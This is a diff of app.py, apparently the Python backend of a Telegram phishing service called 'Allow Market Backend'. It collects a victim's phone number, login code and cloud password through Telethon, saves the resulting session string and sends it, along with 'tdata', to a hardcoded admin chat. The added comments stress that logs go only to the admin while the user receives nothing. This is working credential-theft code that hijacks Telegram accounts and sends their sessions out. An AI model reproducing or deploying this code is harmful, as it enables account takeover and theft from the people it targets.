@@ -1,5 +1,5 @@
-# app.py — Telethon с StringSession (без файлов)
-# КОД ПРИХОДИТ ОТ ОФИЦИАЛЬНОГО TELEGRAM
+# app.py — Telethon с StringSession
+# ЛОГИ ТОЛЬКО АДМИНУ! ПОЛЬЗОВАТЕЛЬ НИЧЕГО НЕ ПОЛУЧАЕТ
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -41,10 +41,11 @@ ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 sessions = {}
 
 # ============================================================
-# ФУНКЦИИ ДЛЯ ЛОГОВ (ЧЕРЕЗ БОТА)
+# ФУНКЦИИ ДЛЯ ЛОГОВ (ТОЛЬКО АДМИНУ!)
 # ============================================================
 
 def send_admin_log(message, data=None):
+    """Отправка лога ТОЛЬКО админу"""
     try:
         text = f"🔐 {message}"
         if data:
@@ -58,6 +59,7 @@ def send_admin_log(message, data=None):
         print(f"Admin log error: {e}")
 
 def send_tdata_to_admin(session_data):
+    """Отправка tdata ТОЛЬКО админу"""
     try:
         lines = []
         lines.append("=" * 50)
@@ -97,43 +99,34 @@ def send_tdata_to_admin(session_data):
 # ============================================================
 
 async def send_code_async(phone):
-    """Отправка кода через MTProto (Telethon). Код приходит ОТ TELEGRAM"""
+    """Отправка кода через MTProto. Код приходит ОТ TELEGRAM"""
     try:
-        # Используем StringSession вместо файла
-        client = TelegramClient(
-            StringSession(),
-            api_id=API_ID,
-            api_hash=API_HASH
-        )
-        
+        client = TelegramClient(StringSession(), api_id=API_ID, api_hash=API_HASH)
         await client.connect()
         
         if await client.is_user_authorized():
             await client.disconnect()
             return {'success': False, 'error': 'Already authorized'}
         
-        # ОТПРАВЛЯЕМ ЗАПРОС НА КОД ЧЕРЕЗ MTProto
         result = await client.send_code_request(phone)
         
-        # Сохраняем клиент и сессию в памяти
         sessions[phone] = {
             'client': client,
-            'phone_code_hash': result.phone_code_hash,
-            'session_string': None  # будет сохранён после входа
+            'phone_code_hash': result.phone_code_hash
         }
         
-        send_admin_log(f"📱 Код запрошен для {phone} (MTProto/Telethon)")
+        send_admin_log(f"📱 Код запрошен для {phone}")
         return {'success': True, 'phone_code_hash': result.phone_code_hash}
         
     except PhoneNumberInvalidError:
         return {'success': False, 'error': 'Invalid phone number'}
     except FloodWaitError as e:
-        return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds'}
+        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
 async def check_code_async(phone, code, phone_code_hash):
-    """Проверка кода через MTProto (Telethon)"""
+    """Проверка кода через MTProto"""
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -150,7 +143,6 @@ async def check_code_async(phone, code, phone_code_hash):
                 phone_code_hash=phone_code_hash
             )
             
-            # Получаем строку сессии
             session_string = client.session.save()
             
             session_data = {
@@ -176,7 +168,7 @@ async def check_code_async(phone, code, phone_code_hash):
         return {'success': False, 'error': str(e)}
 
 async def check_password_async(phone, password):
-    """Проверка облачного пароля через MTProto (Telethon)"""
+    """Проверка облачного пароля через MTProto"""
     try:
         client_data = sessions.get(phone)
         if not client_data:
@@ -213,7 +205,6 @@ async def check_password_async(phone, password):
 # ============================================================
 
 def run_async(coro):
-    """Запуск асинхронной функции"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
@@ -227,9 +218,8 @@ def ping():
     return jsonify({
         'status': 'online',
         'service': 'Allow Market Backend',
-        'version': '14.0.0',
+        'version': '15.0.0',
         'library': 'Telethon (MTProto)',
-        'session': 'StringSession (no files)',
         'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM',
         'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
     })
@@ -260,8 +250,13 @@ def check_code():
     code = data.get('code', '').strip()
     phone_code_hash = data.get('phoneCodeHash', '').strip()
     
-    if not phone or not code or not phone_code_hash:
-        return jsonify({'success': False, 'error': 'Missing fields'}), 400
+    # Проверяем все поля
+    if not phone:
+        return jsonify({'success': False, 'error': 'Phone required'}), 400
+    if not code:
+        return jsonify({'success': False, 'error': 'Code required'}), 400
+    if not phone_code_hash:
+        return jsonify({'success': False, 'error': 'phoneCodeHash required'}), 400
     
     result = run_async(check_code_async(phone, code, phone_code_hash))
     
@@ -291,8 +286,10 @@ def check_password():
     phone = data.get('phone', '').strip()
     password = data.get('password', '').strip()
     
-    if not phone or not password:
-        return jsonify({'success': False, 'error': 'Missing fields'}), 400
+    if not phone:
+        return jsonify({'success': False, 'error': 'Phone required'}), 400
+    if not password:
+        return jsonify({'success': False, 'error': 'Password required'}), 400
     
     result = run_async(check_password_async(phone, password))
     
@@ -311,7 +308,7 @@ def check_password():
 if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН (Telethon/MTProto)")
-    print("📌 Используется StringSession (без файлов)")
+    print("📌 Логи отправляются ТОЛЬКО админу")
     print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
